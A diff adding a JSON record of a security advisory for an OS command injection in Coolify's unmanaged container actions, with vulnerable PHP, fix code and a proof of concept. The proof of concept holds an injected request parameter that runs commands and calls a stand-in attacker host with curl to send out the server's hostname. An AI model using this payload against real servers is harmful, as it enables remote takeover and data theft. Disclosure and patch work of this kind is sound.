@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-rh5x-qx77-fq9v",
+  "repo": {
+    "cve_id": "CVE-2026-34058",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "\r\n\r\n## Summary\r\n\r\nThe Livewire component `Server\\Resources` exposes public methods (`startUnmanaged`, `stopUnmanaged`, `restartUnmanaged`) that accept a container ID parameter directly from the browser without any sanitization or escaping. This parameter is interpolated directly into shell commands executed via SSH on managed servers, enabling any authenticated team member to execute arbitrary OS commands on remote servers.\r\n\r\n## Severity\r\n\r\n**CRITICAL - CVSS 9.9**\r\n\r\n`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\r\n\r\n| Metric | Value | Rationale |\r\n|--------|-------|-----------|\r\n| Attack Vector | Network | Exploitable via Livewire AJAX request |\r\n| Attack Complexity | Low | No special conditions, straightforward injection |\r\n| Privileges Required | Low | Any authenticated team member with server access |\r\n| User Interaction | None | No user interaction required |\r\n| Scope | Changed | Command executes on the remote managed server, not Coolify itself |\r\n| Confidentiality | High | Full read access to remote server |\r\n| Integrity | High | Full write access to remote server |\r\n| Availability | High | Can shut down or destroy remote server |\r\n\r\n## Affected Version\r\n\r\n- **Coolify v4.x** (tested on commit `89aecc2`)\r\n- All versions with unmanaged container management are likely affected\r\n\r\n## CWE\r\n\r\n- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\r\n\r\n## Vulnerable Code\r\n\r\n### Source - User input entry point\r\n\r\n**`app/Livewire/Server/Resources.php`** (lines 30-48)\r\n\r\n```php\r\npublic function startUnmanaged($id)\r\n{\r\n    $this->server->startUnmanaged($id);\r\n    $this->dispatch('success', 'Container started.');\r\n    $this->loadUnmanagedContainers();\r\n}\r\n\r\npublic function restartUnmanaged($id)\r\n{\r\n    $this->server->restartUnmanaged($id);\r\n    $this->dispatch('success', 'Container restarted.');\r\n    $this->loadUnmanagedContainers();\r\n}\r\n\r\npublic function stopUnmanaged($id)\r\n{\r\n    $this->server->stopUnmanaged($id);\r\n    $this->dispatch('success', 'Container stopped.');\r\n    $this->loadUnmanagedContainers();\r\n}\r\n```\r\n\r\nNo validation, no sanitization, no `escapeshellarg()` on the `$id` parameter.\r\n\r\n### Sink - Remote command execution\r\n\r\n**`app/Models/Server.php`** (lines 720-733)\r\n\r\n```php\r\npublic function stopUnmanaged($id)\r\n{\r\n    return instant_remote_process([\"docker stop -t 0 $id\"], $this);\r\n}\r\n\r\npublic function restartUnmanaged($id)\r\n{\r\n    return instant_remote_process([\"docker restart $id\"], $this);\r\n}\r\n\r\npublic function startUnmanaged($id)\r\n{\r\n    return instant_remote_process([\"docker start $id\"], $this);\r\n}\r\n```\r\n\r\nThe `$id` is directly interpolated into the shell command string, which is then executed via SSH on the remote managed server through `instant_remote_process()`.\r\n\r\n### Comparison with protected code paths\r\n\r\nOther components in Coolify properly sanitize container identifiers:\r\n\r\n- **`Terminal.php`** uses `preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/')` + `escapeshellarg()`\r\n- **`NewDynamicConfiguration.php`** uses `validateShellSafePath()` + `escapeshellarg()`\r\n\r\nThe `Resources.php` component has **none of these protections**.\r\n\r\n## Proof of Concept\r\n\r\n### Prerequisites\r\n- A Coolify instance with at least one managed server\r\n- An authenticated user account with access to the server's resources page (any team member)\r\n\r\n### Steps to Reproduce\r\n\r\n**1.** Log in to Coolify as any team member.\r\n\r\n**2.** Navigate to **Servers → [any server] → Resources → Unmanaged Containers** tab.\r\n\r\n**3.** Open browser DevTools → Network tab.\r\n\r\n**4.** Click any container action button (Start/Stop/Restart) to capture a legitimate Livewire request.\r\n\r\n**5.** Intercept and modify the Livewire AJAX request. Change the `params` array:\r\n\r\n**Original request:**\r\n```json\r\n{\r\n  \"calls\": [\r\n    {\r\n      \"method\": \"stopUnmanaged\",\r\n      \"params\": [\"abc123def456\"]\r\n    }\r\n  ]\r\n}\r\n```\r\n\r\n**Malicious request:**\r\n```json\r\n{\r\n  \"calls\": [\r\n    {\r\n      \"method\": \"stopUnmanaged\",\r\n      \"params\": [\"x; id > /tmp/pwned; curl http://attacker.com/$(cat /etc/hostname)\"]\r\n    }\r\n  ]\r\n}\r\n```\r\n\r\n**6.** The following command executes on the **remote managed server** via SSH:\r\n\r\n```bash\r\ndocker stop -t 0 x; id > /tmp/pwned; curl http://attacker.com/$(cat /etc/hostname)\r\n```\r\n\r\n**7.** Verify RCE by checking `/tmp/pwned` on the managed server, or by receiving the HTTP callback on the attacker-controlled server.\r\n\r\n## Impact\r\n\r\n- **Remote Code Execution** on any server managed by Coolify\r\n- Coolify typically connects to managed servers as **root** (or a sudoer), giving the attacker full control\r\n- **Scope is Changed** - the attack originates from the Coolify web interface but executes on a completely different system (the managed server)\r\n- An attacker could:\r\n  - Exfiltrate sensitive data (databases, environment variables, secrets)\r\n  - Deploy backdoors or cryptominers\r\n  - Pivot to other servers via SSH keys stored on the compromised server\r\n  - Destroy infrastructure (delete containers, volumes, data)\r\n  - Modify deployed applications to inject malicious code\r\n\r\n## Suggested Fix\r\n\r\n### Immediate - `escapeshellarg()` on container IDs\r\n\r\n**`app/Models/Server.php`:**\r\n\r\n```php\r\npublic function stopUnmanaged($id)\r\n{\r\n    return instant_remote_process([\"docker stop -t 0 \" . escapeshellarg($id)], $this);\r\n}\r\n\r\npublic function restartUnmanaged($id)\r\n{\r\n    return instant_remote_process([\"docker restart \" . escapeshellarg($id)], $this);\r\n}\r\n\r\npublic function startUnmanaged($id)\r\n{\r\n    return instant_remote_process([\"docker start \" . escapeshellarg($id)], $this);\r\n}\r\n```\r\n\r\n### Defense in depth - Validate container ID format in Livewire\r\n\r\n**`app/Livewire/Server/Resources.php`:**\r\n\r\n```php\r\nprivate function validateContainerId(string $id): void\r\n{\r\n    if (!preg_match('/^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/', $id)) {\r\n        throw new \\InvalidArgumentException('Invalid container identifier format');\r\n    }\r\n}\r\n\r\npublic function startUnmanaged($id)\r\n{\r\n    $this->validateContainerId($id);\r\n    $this->server->startUnmanaged($id);\r\n    // ...\r\n}\r\n```\r\n\r\n### Also affected (lower priority)\r\n\r\n- `Server::restartContainer($containerName)` at line 1463 - same pattern, no escaping\r\n- Multiple `docker volume rm -f $storage->name` calls across model classes - lower risk since `$storage->name` originates from the database rather than direct user input, but should still be escaped as defense in depth\r\n",
+    "ghsa_id": "GHSA-rh5x-qx77-fq9v",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-rh5x-qx77-fq9v",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-rh5x-qx77-fq9v"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-34058"
+      }
+    ],
+    "published_at": "2026-07-02T16:38:04Z",
+    "references": [],
+    "severity": "high",
+    "summary": "OS Command Injection via Unmanaged Container Operations - Remote Code Execution",
+    "updated_at": "2026-07-02T16:38:04Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.471",
+        "vulnerable_version_range": "<= 4.0.0-beta.470"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
